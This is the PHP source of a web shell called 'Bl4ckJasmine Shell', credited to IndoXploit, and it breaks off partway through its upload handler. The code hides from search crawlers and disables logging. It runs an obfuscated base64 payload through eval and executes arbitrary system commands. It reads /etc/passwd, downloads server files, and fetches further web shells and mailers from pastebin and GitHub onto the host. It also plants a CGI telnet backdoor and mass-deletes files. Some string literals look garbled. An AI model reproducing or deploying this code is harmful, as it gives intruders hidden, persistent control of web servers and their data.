<?php @set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$SERVERIP = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
$FILEPATH = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
function login_shell() {
?>
<!DOCTYPE HTML>
<html>
<head>
<title>Bl4ckJasmine Shell</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: red;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: gray;
	background: transparent;
	border: 1px dotted black;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<header>
	<pre>


               _ 
              (\  _                      ___
             .-"`"(\                _.""`   `"-.
            /      ` `-._        _.-"            `\__
           6   6)        `-.__.-'                    `",
          /                                         `;-`
         /     ,                                     |
        ()    /  /`                                  |
         `---`"~``\                                  |
                   \                                 |
                    \            \      /           /
                    /`,   ,      |     |           /
                   /   "-.|      |     |         /'
                  /     / |     /,__   |       /`\
             blj /    /'  |    /    `"'\      (   \
              __/   /'    |   |         `\     \   \
              \    /      |   |           `\    \   \
               `-,/      /    |            /     |-"`
                        `"""^^^           `^^""""`
                   
	</pre>
</header>
<form method="post">
<input type="password" name="password">
</form>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) if (empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password))) $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
else login_shell();
if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
///path dir
$untukdir = "JF9LPV9fU1RVUElEX187DQokX0M9ImJaSFJUb013RklhdlI4STdIQnN1SU1QTjY1RWxxR3V5eFJnVW1EZUxJUVVxWXdOS2FISEJ4WGNYV25FbTJ2VHF6M2UrYzNwcXZPYzhGd2tzd1lqdVBlOWhnM2RJUmh5OU9ycVd2NEZwak1nU0VMTGdyR3NBWTliWDNUaVhnRFZTRkdEL0Jmczc1T05ITDhUUjdXcmxTMXVQbldnTXcvbU5yY1B3S1ZwN1FUaENlWFg0QS9uNGVZdURNTnI2bXhFVHBNbW9HTENHbk5xbVNHbkNVbW9PUFdhRHcxTFlvVTNiUXRwUXdUSm9LRzhMQVhzaDZzVjhQa3JpN3VjSlNKWEZMTzNVRU9pdXpSYndEd25YWUpCVzdLT2FjSzdLaG9WZDBiSVduWnpENnZjRmJrbnl3a1NrSXNlU1ZBbmhwSEt6SVpzbHJFUzJHdENXRGUyTHozTGdVOWY2U3d0T2U4djN5cWRUbWJ1Y2lvU3hZMDVOOVY4ZnZVZ1Jsak9aZkFFPQkiOw0KZXZhbChiYXNlNjRfZGVjb2RlKCJKRjlEUFdkNmFXNW1iR0YwWlNoaVlYTmxOalJmWkdWamIyUmxLQ1JmUXlrcE93MEtKRjlWUFdWeVpXZGZjbVZ3YkdGalpTZ25YMTlUVkZWUVNVUmZYeWNzSWljaUxpUmZTeTRpSnlJc0pGOURLVHNOQ21WMllXd29KRjlWS1RzTkNpUmZWVDB3T3cwS0pGOURQVEE3Q1E9PQkiKSk7DQo=	";
eval(base64_decode($untukdir));
if (get_magic_quotes_gpc()) {
    function idx_ss($array) {
        return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
    }
    $_POST = idx_ss($_POST);
}
?>
<!DOCTYPE HTML>
<html>
<!--
###############################################################################
// Thanks buat Orang-orang yg membantu dalam proses pembuatan shell ini.
// Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
// Tapi Selebihnya, itu hasil kreasi IndoXploit sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member IndoXploit. & All My Friends.
###############################################################################
// Special Thanks: Depok Cyber Security | Sanjungan Jiwa | 0x1999
###############################################################################
-->
<head>
<title>Bl4ckJasmine Shell</title>
<meta name='author' content='IndoXploit'>
<meta charset="UTF-8">
<style type='text/css'>
html {
    background: #000000;
	color: #ffffff;
	font-size: 14px;
	width: 100%;
}

li {
	display: inline;
	margin: 5px;
	padding: 5px;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: gold;
	text-decoration: underline;
}

b {
	color: gold;
}

pre {
	font-size: 13px;
}

table, th, td {
	margin : 2px;
	padding: 2px;
	border-collapse:collapse;
	background: transparent;
	font-family: 'courier';
	font-size: 12px;
}

.table_home, .th_home, .td_home {

	border: 1px solid #292e28;
}

.th_home {
	color: lime;
}

.td_home, .td_home > a {
	color: #ffffff;
}

.td_home > a:hover {
	color: gold;
}

th {
	padding: 3px;
}

tr:hover {
	background: #006400;
	color: #ffffff;
}

input[type=text], input[type=password], .input {
	background: transparent; 
	color: #ffffff;
	border: 1px solid #ffffff;
	padding: 3px;
	font-family: 'courier';
	font-size: 13px;
}



input:focus, textarea:focus {
  outline: 0;
  border-color: #ffffff;
}

textarea {
	border: 1px solid #ffffff;
	width: 40%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'courier';
	font-size: 13px;
}
iframe {
	width: 100%;
	min-height: 500px;
}
</style>
</head>
<body>
<?php
function path() {
    if (isset($_GET['dir'])) {
        $dir = str_replace("\", " / ", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\", " / ", getcwd());
	}
	return $dir;
}

function color($bold = 1, $colorid = null, $string = null) {
		$color = array(
			" < / font > ",  			# 0 off
			" < fontcolor = 'red' > ",	# 1 red 
			" < fontcolor = 'lime' > ",	# 2 lime
			" < fontcolor = 'white' > ",	# 3 white
			" < fontcolor = 'gold' > ",	# 4 gold
			" < fontcolor = 'green' > ",	# 5 green
			" < fontcolor = 'purple' > ",	# 6 purle
			" < fontcolor = 'pink' > ",	# 7 pink
		);

	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
}

function OS() {
	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}

function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function save($filename, $mode, $file) {
	$handle = fopen($filename, $mode);
	fwrite($handle, $file);
	fclose($handle);
	return;
}

function getfile($name) {
	if(!is_writable(path())) die(color(1, 1, "Directory'".path()."'isnotwriteable . Can't spawn $name."));
	if($name === "-a") $get = array("https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php", "adminer.php");
	elseif($name === "-p") $get = array("https://pastebin.com/raw/XVU8EeTZ", "pasirmerah.php");
	elseif($name === "-i") $get = array("https://pastebin.com/raw/nC6pWh5a", "indoxploit.php");
	elseif($name === "-s") $get = array("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/sabun.php", "sabun.php");
	
	elseif($name === "-w") $get = array("https://pastebin.com/raw/xagjqVUf", "wso.php");
	elseif($name === "-d") $get = array("http://pastebin.com/raw/6Sp89ryJ", "dump.php");
	elseif($name === "-m") $get = array("https://pastebin.com/raw/9RxQM885", "magentools.php");
	
	elseif($name === "-h") $get = array("http://pastebin.com/raw/exwC4G2T", "hsphere.php");
	elseif($name === "-aa") $get = array("http://pastebin.com/raw/qNpQ8uPnJ", "anon.php");
	elseif($name === "-ww") $get = array("https://pastebin.com/raw/ZpPST0eT", "weevely.php");
	elseif($name === "-ma") $get = array("http://pastebin.com/raw/bv9wDvqZ", "mailer.php");

	$fp = fopen($get[1], "w");
	$ch = curl_init();
	 	  curl_setopt($ch, CURLOPT_URL, $get[0]);
	 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
	 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	   	  curl_setopt($ch, CURLOPT_FILE, $fp);
	return curl_exec($ch);
	   	  curl_close($ch);
	fclose($fp);
	ob_flush();
	flush();
}

function usergroup() {
	if(!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}

function getuser() {
	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can'tread / etc / passwd"));
	while($read = fgets($fopen)) {
		preg_match_all('/(.*?):x:/', $read, $getuser);
		$user[] = $getuser[1][0];
	}
	return $user;
}

function getdomainname() {
	$fopen = fopen(" / etc / named . conf", "r");
	while($read = fgets($fopen)) {
		preg_match_all(" #/var/named/(.*?).db#", $read, $getdomain);
        $domain[] = $getdomain[1][0];
    }
    return $domain;
}
function hddsize($size) {
    if ($size >= 1073741824) return sprintf('%1.2f', $size / 1073741824) . ' GB';
    elseif ($size >= 1048576) return sprintf('%1.2f', $size / 1048576) . ' MB';
    elseif ($size >= 1024) return sprintf('%1.2f', $size / 1024) . ' KB';
    else return $size . ' B';
}
function hdd() {
    $hdd['size'] = hddsize(disk_total_space("/"));
    $hdd['free'] = hddsize(disk_free_space("/"));
    $hdd['used'] = $hdd['size'] - $hdd['free'];
    return (object)$hdd;
}
function writeable($path, $perms) {
    return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
}
function perms($path) {
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info.= (($perms & 0x0100) ? 'r' : '-');
    $info.= (($perms & 0x0080) ? 'w' : '-');
    $info.= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info.= (($perms & 0x0020) ? 'r' : '-');
    $info.= (($perms & 0x0010) ? 'w' : '-');
    $info.= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info.= (($perms & 0x0004) ? 'r' : '-');
    $info.= (($perms & 0x0002) ? 'w' : '-');
    $info.= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
function lib_installed() {
    $lib[] = "MySQL: " . (function_exists('mysql_connect') ? color(1, 2, "ON") : color(1, 1, "OFF"));
    $lib[] = "cURL: " . (function_exists('curl_version') ? color(1, 2, "ON") : color(1, 1, "OFF"));
    $lib[] = "WGET: " . (exe('wget --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
    $lib[] = "Perl: " . (exe('perl --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
    $lib[] = "Python: " . (exe('python --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
    return implode(" | ", $lib);
}
function pwd() {
    $dir = explode("/", path());
    foreach ($dir as $key => $index) {
        print "<a href='?dir=";
        for ($i = 0;$i <= $key;$i++) {
            print $dir[$i];
            if ($i != $key) {
                print "/";
            }
        }
        print "'>$index</a>/";
    }
    print "<br>";
    print (OS() === "Windows") ? windisk() : "";
}
function windisk() {
    $letters = "";
    $v = explode("\", path());
	$v = $v[0];
	 foreach(range("A", "Z") as $letter) {
	  	$bool = $isdiskette = in_array($letter, array("A"));
	  	if(!$bool) $bool = is_dir("$letter:
        \");
	  	if($bool) {
	   		$letters .= "[ < ahref = '?dir=$letter:\'".($isdiskette?" onclick=\"return confirm('Makesurethatthedisketteisinsertedproperly, otherwiseanerrormayoccur . ')\"":"").">";
	   		if($letter.":" != $v) {
	   			$letters .= $letter;
	   		}
	   		else {
	   			$letters .= color(1, 2, $letter);
	   		}
	   		$letters .= "</a> ]";
	  	}
	}
	if(!empty($letters)) {
		print "Detected Drives $letters<br>";
	}
	if(count($quicklaunch) > 0) {
		foreach($quicklaunch as $item) {
	  		$v = realpath(path(). "..");
	  		if(empty($v)) {
	  			$a = explode(DIRECTORY_SEPARATOR,path());
	  			unset($a[count($a)-2]);
	  			$v = join(DIRECTORY_SEPARATOR, $a);
	  		}
	  		print "<a href='".$item[1]."'>".$item[0]."</a>";
		}
	}
}
function serverinfo() 
{
	print ' < center > ';
	$disable_functions = @ini_get('disable_functions');
	$disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");
	$output[] = "!".color(1, 2, $GLOBALS['SERVERIP'])."!";
	$output[] = color(5, 5, $_SERVER['SERVER_SOFTWARE']);
	$output[] = color(5, 5, php_uname());
	$output[] = color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
	$output[] = "SAFEMODE  : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
	$output[] = "DF: $disable_functions";
	$output[] = lib_installed();
	$output[] = "cwd : (".writeable(path(), perms(path())).") ";
	print "<pre>";
	
	print implode("<br>", $output);
	
	pwd();
	print "</pre>";

}
function curl($url, $post = false, $data = null) {
    $ch = curl_init($url);
    	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    	  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    	  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    	  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    if($post) {
    	  curl_setopt($ch, CURLOPT_POST, true);
    	  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    $curl['exec'] = curl_exec($ch);
	$curl['info'] = curl_getinfo($ch);

	return [
		"info" 		=> $curl['info'],
		"response" 	=> $curl['exec']
	];

		  curl_close($ch);
}

function reverse() {
	$response = curl("http://domains.yougetsignal.com/domains.php", TRUE, "remoteAddress=".$GLOBALS['SERVERIP']."&ket=")['response'];
	$response = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $response)))))))))))));
	$explode  = explode(",, ", $response);
	unset($explode[0]);

	foreach($explode as $domain) {
		$domain = "http: //$domain";
            $domain = str_replace(",", "", $domain);
            $url[] = $domain;
            ob_flush();
            flush();
        }
        return $url;
    }
    function getValue($param, $kata1, $kata2) {
        if (strpos($param, $kata1) === FALSE) return FALSE;
        if (strpos($param, $kata2) === FALSE) return FALSE;
        $start = strpos($param, $kata1) + strlen($kata1);
        $end = strpos($param, $kata2, $start);
        $return = substr($param, $start, $end - $start);
        return $return;
    }
    function massdelete($dir, $filename) {
        $scandir = scandir($dir);
        foreach ($scandir as $dir_) {
            $path = "$dir/$dir_";
            $location = "$path/$filename";
            if ($dir_ === '.') {
                if (file_exists("$dir/$filename")) {
                    unlink("$dir/$filename");
                }
            } elseif ($dir_ === '..') {
                if (file_exists(dirname($dir) . "/$filename")) {
                    unlink(dirname($dir) . "/$filename");
                }
            } else {
                if (is_dir($path) AND is_writable($path)) {
                    if (file_exists($location)) {
                        print "[" . color(1, 2, "DELETED") . "] " . color(1, 4, $location) . "<br>";
                        unlink($location);
                        massdelete($path, $filename);
                    }
                }
            }
        }
    }
    function tools($toolsname, $args = null) {
        if ($toolsname === "cmd") {
            print "<form method='post' action='?njing=cmd&dir=" . path() . "' style='margin-top: 15px;'>
		<font size='3' color='red'>
			  " . usergroup()->name . "@" . $GLOBALS['SERVERIP'] . ": ~ $
			  </font><input style='border: none; border-bottom: 1px solid #FFD700;' type='text' name='cmd' required>
			  <input class='input' type='submit' value='>>'>
			  </form>";
            echo "
			<br>
			<font size='3' color='green'><i>type 'help' for more tools</i></font>
			<br>
			
			";
        } elseif ($toolsname === "readfile") {
            if (empty($args)) die(color(1, 1, $msg));
            if (!is_file($args)) die(color(1, 1, "File '$args' is not exists."));
            print "<pre>";
            print htmlspecialchars(file_get_contents($args));
            print "</pre>";
        } elseif ($toolsname === "spawn") {
            if ($args === "-a") {
                if (file_exists("adminer.php")) {
                    print "Login Adminer: <a href='" . $GLOBALS['FILEPATH'] . "/adminer.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/adminer.php</a>";
                } else {
                    if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create file 'Adminer'."));
                    if (getfile("-a")) {
                        print "Login Adminer: <a href='" . $GLOBALS['FILEPATH'] . "/adminer.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/adminer.php</a>";
                    } else {
                        print color(1, 1, "Error while downloading file Adminer.");
                        @unlink("adminer.php");
                    }
                }
            } elseif ($toolsname === "spawn") {
                if ($args === "-p") {
                    if (file_exists("pasirmerah.php")) {
                        print "pasirmerah: <a href='" . $GLOBALS['FILEPATH'] . "/pasirmerah.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/pasirmerah.php</a>";
                    } else {
                        if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create file 'pasirmerah'."));
                        if (getfile("-p")) {
                            print "pasirmerah: <a href='" . $GLOBALS['FILEPATH'] . "/pasirmerah.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/pasirmerah.php</a>";
                        } else {
                            print color(1, 1, "Error while downloading file pasirmerah.");
                            @unlink("pasirmerah.php");
                        }
                    }
                }
            }
            if ($toolsname === "spawn") {
                if ($args === "-i") {
                    if (file_exists("indoxploit.php")) {
                        print "indoxploit: <a href='" . $GLOBALS['FILEPATH'] . "/indoxploit.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/indoxploit.php</a>";
                    } else {
                        if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create file 'indoxploit'."));
                        if (getfile("-i")) {
                            print "indoxploit: <a href='" . $GLOBALS['FILEPATH'] . "/indoxploit.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/indoxploit.php</a>";
                        } else {
                            print color(1, 1, "Error while downloading file indoxploit.");
                            @unlink("indoxploit.php");
                        }
                    }
                }
            }
            if ($toolsname === "spawn") {
                if ($args === "-s") {
                    if (file_exists("sabun.php")) {
                        print "sabun: <a href='" . $GLOBALS['FILEPATH'] . "/sabun.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/sabun.php</a>";
                    } else {
                        if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create file 'sabun'."));
                        if (getfile("-s")) {
                            print "sabun: <a href='" . $GLOBALS['FILEPATH'] . "/sabun.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/sabun.php</a>";
                        } else {
                            print color(1, 1, "Error while downloading file sabun.");
                            @unlink("sabun.php");
                        }
                    }
                }
            }
            if ($toolsname === "spawn") {
                if ($args === "-d") {
                    if (file_exists("dump.php")) {
                        print "dump: <a href='" . $GLOBALS['FILEPATH'] . "/dump.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/dump.php</a>";
                    } else {
                        if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create file 'dump'."));
                        if (getfile("-d")) {
                            print "dump: <a href='" . $GLOBALS['FILEPATH'] . "/dump.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/dump.php</a>";
                        } else {
                            print color(1, 1, "Error while downloading file dump.");
                            @unlink("dump.php");
                        }
                    }
                }
            }
            if ($toolsname === "spawn") {
                if ($args === "-m") {
                    if (file_exists("magentools.php")) {
                        print "magentools: <a href='" . $GLOBALS['FILEPATH'] . "/magentools.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/magentools.php</a>";
                    } else {
                        if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create file 'magentools'."));
                        if (getfile("-m")) {
                            print "magentools: <a href='" . $GLOBALS['FILEPATH'] . "/magentools.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/magentools.php</a>";
                        } else {
                            print color(1, 1, "Error while downloading file magentools.");
                            @unlink("magentools.php");
                        }
                    }
                }
            }
            if ($toolsname === "spawn") {
                if ($args === "-h") {
                    if (file_exists("hsphere.php")) {
                        print "hsphere: <a href='" . $GLOBALS['FILEPATH'] . "/hsphere.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/hsphere.php</a>";
                    } else {
                        if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create file 'hsphere'."));
                        if (getfile("-h")) {
                            print "hsphere: <a href='" . $GLOBALS['FILEPATH'] . "/hsphere.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/hsphere.php</a>";
                        } else {
                            print color(1, 1, "Error while downloading file hsphere.");
                            @unlink("hsphere.php");
                        }
                    }
                }
            }
            if ($toolsname === "spawn") {
                if ($args === "-aa") {
                    if (file_exists("anon.php")) {
                        print "anon: <a href='" . $GLOBALS['FILEPATH'] . "/anon.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/anon.php</a>";
                    } else {
                        if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create file 'anon'."));
                        if (getfile("-aa")) {
                            print "Anonghost: <a href='" . $GLOBALS['FILEPATH'] . "/anon.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/anon.php</a>";
                        } else {
                            print color(1, 1, "Error while downloading file anon.");
                            @unlink("anon.php");
                        }
                    }
                }
            }
            if ($toolsname === "spawn") {
                if ($args === "-ma") {
                    if (file_exists("mailer.php")) {
                        print "mailer: <a href='" . $GLOBALS['FILEPATH'] . "/mailer.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/mailer.php</a>";
                    } else {
                        if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create file 'mailer'."));
                        if (getfile("-ma")) {
                            print "mailer: <a href='" . $GLOBALS['FILEPATH'] . "/mailer.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/mailer.php</a>";
                        } else {
                            print color(1, 1, "Error while downloading file mailer.");
                            @unlink("mailer.php");
                        }
                    }
                }
            }
            if ($toolsname === "spawn") {
                if ($args === "-ww") {
                    if (file_exists("weevely.php")) {
                        print "weevely: <a href='" . $GLOBALS['FILEPATH'] . "/weevely.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/weevely.php</a>";
                    } else {
                        if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create file 'weevely'."));
                        if (getfile("-ww")) {
                            print "weevely: <a href='" . $GLOBALS['FILEPATH'] . "/weevely.php' target='_blank'>http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/weevely.php</a>";
                        } else {
                            print color(1, 1, "Error while downloading file weevely.");
                            @unlink("weevely.php");
                        }
                    }
                }
            } elseif ($args === "cgitelnet1") {
                if (file_exists("idx_cgi/cgitelnet1.idx")) {
                    print "<iframe src='http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
                } elseif (file_exists('cgitelnet1.idx')) {
                    print "<iframe src='http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
                } else {
                    if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create directory 'idx_cgi'."));
                    if (!is_dir(path() . "/idx_cgi/")) {
                        @mkdir('idx_cgi', 0755);
                        save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
                    }
                    if (getfile("cgitelnet1")) {
                        chmod('idx_cgi/cgitelnet1.idx', 0755);
                        print "<iframe src='http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
                    } else {
                        print color(1, 1, "Error while downloading file CGI Telnet.");
                        @rmdir(path() . "/idx_cgi/");
                        if (!@rmdir(path() . "/idx_cgi/") AND OS() === "Linux") @exe("rm -rf " . path() . "/idx_cgi/");
                        if (!@rmdir(path() . "/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q " . path() . "/idx_cgi/");
                    }
                }
            } elseif ($args === "cgitelnet2") {
                if (file_exists("idx_cgi/cgitelnet2.idx")) {
                    print "<iframe src='http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
                } elseif (file_exists('cgitelnet2.idx')) {
                    print "<iframe src='http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/cgitelnet2.idx' frameborder='0' scrolling='no'></iframe>";
                } else {
                    if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create directory 'idx_cgi'."));
                    if (!is_dir(path() . "/idx_cgi/")) {
                        @mkdir('idx_cgi', 0755);
                        save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
                    }
                    if (getfile("cgitelnet2")) {
                        chmod('idx_cgi/cgitelnet2.idx', 0755);
                        print "<iframe src='http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
                    } else {
                        print color(1, 1, "Error while downloading file CGI Telnet.");
                        @rmdir(path() . "/idx_cgi/");
                        if (!@rmdir(path() . "/idx_cgi/") AND OS() === "Linux") @exe("rm -rf " . path() . "/idx_cgi/");
                        if (!@rmdir(path() . "/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q " . path() . "/idx_cgi/");
                    }
                }
            } elseif ($args === "phpinfo") {
                if (file_exists('phpinfo.php') AND preg_match("/phpinfo()/", file_get_contents('phpinfo.php'))) {
                    print "<iframe src='http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
                } else {
                    if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create file 'phpinfo'."));
                    save("phpinfo.php", "w", "<?php print '<html><style>html,body {background: #000000;}</style><div style=\'background: #000000; color: #cccccc;\'>'; phpinfo(); print '</div></html>'; ?>");
                    print "<iframe src='http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
                }
            }
        } elseif ($toolsname === "upload") {
            if ($_POST['upload']) {
                if ($_POST['uploadtype'] === '1') {
                    if (@copy($_FILES['file']['tmp_name'], path() . DIRECTORY_SEPARATOR . $_FILES['file']['name'] . "")) {
